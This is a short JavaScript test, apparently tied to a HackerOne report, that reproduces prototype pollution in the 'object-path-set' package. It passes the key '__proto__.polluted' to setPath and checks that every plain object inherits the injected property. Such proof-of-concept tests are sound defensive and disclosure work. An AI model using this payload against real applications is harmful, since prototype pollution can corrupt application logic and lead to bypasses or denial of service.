//https://hackerone.com/reports/878332
test("prototype pollution in object-path", () => {
  const setPath = require("object-path-set");

  expect({}.polluted).toBe(undefined);
  setPath({}, "__proto__.polluted", "yes");
  expect({}.polluted).toBe("yes");
});
